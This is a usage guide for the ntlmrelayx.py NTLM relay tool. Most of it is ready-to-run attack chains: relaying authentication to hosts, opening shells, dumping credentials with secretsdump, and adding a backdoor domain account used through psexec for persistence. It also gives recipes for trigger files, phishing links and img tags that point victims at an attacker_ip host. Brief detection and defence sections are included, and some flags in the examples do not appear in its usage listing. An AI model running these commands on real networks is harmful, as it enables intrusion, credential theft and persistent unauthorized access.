# ntlmrelayx.py

## Overview
`ntlmrelayx.py` is a powerful NTLM relay attack tool that intercepts and relays NTLM authentication attempts to target systems. This tool is essential for lateral movement and privilege escalation in Windows environments where NTLM authentication is used.

## Detailed Description
NTLM relay attacks exploit the challenge-response nature of NTLM authentication by acting as a man-in-the-middle between a client and server. The tool captures NTLM authentication attempts and relays them to target systems, potentially gaining access without needing to crack passwords.

### Key Features:
- **Multi-protocol Support**: HTTP, SMB, LDAP, SMTP, IMAP, POP3
- **Authentication Relay**: Relay NTLM authentication between protocols
- **Command Execution**: Execute commands on successfully compromised targets
- **SOCKS Proxy**: Establish SOCKS proxy for persistent access
- **LDAP Integration**: Perform LDAP operations during relay
- **Anti-spoofing**: Bypass various NTLM relay protections

### Technical Details:
- Exploits lack of cryptographic binding in NTLM
- Works across different protocols (cross-protocol relay)
- Can bypass SMB signing when not enforced
- Leverages various triggers for authentication (e.g., UNC paths, web requests)

## Command Line Options

```
usage: ntlmrelayx.py [-h] [-ts] [-debug] [-t TARGET] [-tf TARGETSFILE] 
                     [-w] [-i] [-ip INTERFACE_IP] [-port PORT] [-wh WPAD_HOST] 
                     [-wa WPAD_AUTH_NUM] [-6] [-smb2support] [-smb-port SMB_PORT]
                     [-c COMMAND] [-e FILE] [-l LOOTDIR] [-of OUTPUTFILE]
                     [--remove-mic] [--serve-image SERVE_IMAGE] [-ra]
                     [--lootdir LOOTDIR] [--randomtargets] [--no-smb-server]
                     [--no-http-server] [--no-wcf-server] [--no-raw-server]
                     [--smb-server-ip SMB_SERVER_IP] [--smb-server-port SMB_SERVER_PORT]
                     [--http-server-ip HTTP_SERVER_IP] [--http-server-port HTTP_SERVER_PORT]

Protocol Options:
  -t                    Target to relay credentials to
  -tf                   File containing targets
  -smb2support          SMB2 support
  -smb-port             SMB port to connect to on target
  
Server Options:
  -w                    Start HTTP server
  -i                    Start interactive shell
  -ip                   Interface IP to bind servers to
  -port                 Port for HTTP server
  -wh                   WPAD host
  -6                    IPv6 support
  --no-smb-server       Disable SMB server
  --no-http-server      Disable HTTP server
  
Attack Options:
  -c                    Command to execute on target
  -e                    File to execute on target
  -l                    Loot directory for captured data
  --remove-mic          Remove MIC (Message Integrity Check)
  --serve-image         Serve image file to trigger auth
  -ra                   Relay to all targets
```

## Usage Examples

### Basic SMB Relay
```bash
# Relay SMB authentication to single target
python3 ntlmrelayx.py -t 192.168.1.100 -smb2support

# Relay to multiple targets from file
python3 ntlmrelayx.py -tf targets.txt -smb2support

# Execute command on successful relay
python3 ntlmrelayx.py -t 192.168.1.100 -c "whoami" -smb2support
```

### HTTP to SMB Relay
```bash
# Start HTTP server and relay to SMB
python3 ntlmrelayx.py -t 192.168.1.100 -w -smb2support

# Use custom HTTP port
python3 ntlmrelayx.py -t 192.168.1.100 -w -port 8080 -smb2support

# Serve image to trigger authentication
python3 ntlmrelayx.py -t 192.168.1.100 -w --serve-image /path/to/image.jpg -smb2support
```

### Interactive Shell
```bash
# Get interactive shell on target
python3 ntlmrelayx.py -t 192.168.1.100 -i -smb2support

# Access shell via netcat
nc 127.0.0.1 11000
```

### SOCKS Proxy
```bash
# Establish SOCKS proxy
python3 ntlmrelayx.py -t 192.168.1.100 -socks -smb2support

# Use SOCKS proxy with proxychains
proxychains python3 smbclient.py target.domain.com
```

### Advanced Options
```bash
# Remove MIC to bypass some protections
python3 ntlmrelayx.py -t 192.168.1.100 --remove-mic -smb2support

# Enable debug mode
python3 ntlmrelayx.py -t 192.168.1.100 -debug -smb2support

# Loot directory for captured data
python3 ntlmrelayx.py -t 192.168.1.100 -l /tmp/loot -smb2support
```

## Attack Chain Integration

### Initial Network Compromise
```bash
# Step 1: Set up ntlmrelayx for credential capture
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Step 2: Trigger authentication (various methods)
# - Send malicious document with UNC path
# - Use responder to capture broadcasts
# - Social engineering to visit malicious webpage

# Step 3: Use captured access for further exploitation
python3 secretsdump.py -use-vss target.domain.com
```

### Responder Integration
```bash
# Terminal 1: Start responder to capture auth
python3 Responder.py -I eth0 -w

# Terminal 2: Set up relay attack
python3 ntlmrelayx.py -tf targets.txt -smb2support

# Combined approach captures and relays simultaneously
```

### Lateral Movement Chain
```bash
# Step 1: Relay to obtain initial access
python3 ntlmrelayx.py -t 192.168.1.100 -i -smb2support

# Step 2: Use interactive shell to gather info
# In relay shell:
# net user /domain
# net group "Domain Admins" /domain
# wmic computersystem get domain

# Step 3: Extract credentials for further attacks
python3 secretsdump.py domain.com/captured_user@192.168.1.100
```

### Privilege Escalation Chain
```bash
# Step 1: Relay low-privilege user to admin target
python3 ntlmrelayx.py -t domain_controller.domain.com -smb2support

# Step 2: Execute high-privilege commands
python3 ntlmrelayx.py -t dc.domain.com -c "net user backdoor P@ss123 /add /domain" -smb2support

# Step 3: Use created account for persistence
python3 psexec.py domain.com/backdoor:P@ss123@dc.domain.com
```

## Common Attack Scenarios

### Web-to-SMB Relay
```bash
# Set up HTTP server for relay
python3 ntlmrelayx.py -t 192.168.1.100 -w -smb2support

# Social engineering: Send link to http://attacker_ip/share
# Or embed in HTML: <img src="http://attacker_ip/image.jpg">
```

### WPAD Poisoning Attack
```bash
# Poison WPAD requests and relay
python3 ntlmrelayx.py -t 192.168.1.100 -wh 192.168.1.50 -smb2support

# Combine with DHCP spoofing for better results
```

### Cross-Protocol Relay
```bash
# LDAP to SMB relay for AD enumeration
python3 ntlmrelayx.py -t ldap://dc.domain.com -smb2support

# SMTP to SMB relay
python3 ntlmrelayx.py -t 192.168.1.100 --smtp -smb2support
```

## Authentication Triggers

### Common Triggers for NTLM Authentication
1. **UNC Paths**: `\\attacker_ip\share`
2. **Web Requests**: `http://attacker_ip/resource`
3. **SCF Files**: Desktop.ini, folder.scf in network shares
4. **Office Documents**: Embedded UNC paths in documents
5. **Email HTML**: `<img>` tags with UNC paths
6. **Shortcut Files**: .lnk files with UNC paths

### Creating Trigger Files
```bash
# Create SCF file for SMB authentication
echo '[Shell]
Command=2
IconFile=\\attacker_ip\share\icon.ico
[Taskbar]
Command=ToggleDesktop' > folder.scf

# Create malicious shortcut
echo '[InternetShortcut]
URL=\\attacker_ip\share' > malicious.url
```

## Prerequisites
- Network access to target environment
- Ability to trigger NTLM authentication
- SMB signing disabled or not enforced on targets
- Knowledge of target IP addresses or hostnames

## Detection Considerations
- **Network Indicators**: Unusual SMB/HTTP traffic patterns between hosts
- **Authentication Patterns**: NTLM authentication from unexpected sources
- **Event Logs**: Event ID 4624/4625 (logon success/failure) with unusual patterns
- **Process Indicators**: Unexpected command execution via relayed sessions
- **Time Correlation**: Authentication attempts correlating with external triggers

## Defensive Measures
- **SMB Signing**: Enable and enforce SMB signing on all systems
- **LDAP Signing**: Enable LDAP signing and channel binding
- **EPA (Extended Protection)**: Enable Extended Protection for Authentication
- **Network Segmentation**: Limit SMB traffic between network segments
- **Monitoring**: Implement monitoring for cross-protocol authentication
- **Patch Management**: Keep systems updated to prevent relay vulnerabilities
- **Authentication Policies**: Implement strong authentication policies

## Bypass Techniques

### SMB Signing Bypass
```bash
# Check if SMB signing is required
nmap -p 445 --script smb2-security-mode target.domain.com

# Use remove-mic to bypass some protections
python3 ntlmrelayx.py -t target.domain.com --remove-mic -smb2support
```

### Cross-Protocol Attacks
```bash
# HTTP to LDAP relay
python3 ntlmrelayx.py -t ldap://dc.domain.com -w

# SMTP to SMB relay
python3 ntlmrelayx.py -t smb://target.domain.com --smtp
```

## Common Errors and Troubleshooting

### SMB Signing Enforced
```
[-] SMB Signing is required on target, cannot relay
Solution: Find targets without SMB signing or use different protocols
```

### Network Connectivity Issues
```bash
# Test SMB connectivity
smbclient -L //target.domain.com -N

# Check if ports are open
nmap -p 445,139 target.domain.com
```

### No Authentication Received
```bash
# Verify responder configuration
python3 Responder.py -I eth0 -A

# Check if triggers are working
curl http://attacker_ip/test
```

## Related Tools
- [Responder.py](https://github.com/lgandx/Responder) - LLMNR/NBT-NS poisoning for auth capture
- [secretsdump.py](secretsdump.md) - Extract credentials after successful relay
- [psexec.py](psexec.md) - Execute commands using relayed authentication
- [smbclient.py](smbclient.md) - Access SMB shares with relayed authentication
- [rpcdump.py](rpcdump.md) - Enumerate RPC endpoints on relay targets
